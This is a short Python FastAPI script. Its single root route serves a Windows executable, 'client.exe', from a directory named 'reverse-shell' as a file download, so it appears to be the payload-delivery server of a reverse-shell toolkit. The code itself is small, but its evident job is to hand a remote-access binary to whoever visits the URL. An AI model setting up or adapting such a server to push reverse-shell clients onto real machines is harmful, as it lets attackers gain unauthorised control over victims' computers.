from fastapi import FastAPI, File, UploadFile
from typing_extensions import Annotated
from starlette.responses import FileResponse

app = FastAPI()

@app.get("/")
def root():
    return FileResponse("../reverse-shell/client.exe", media_type='application/octet-stream',filename="client.exe")
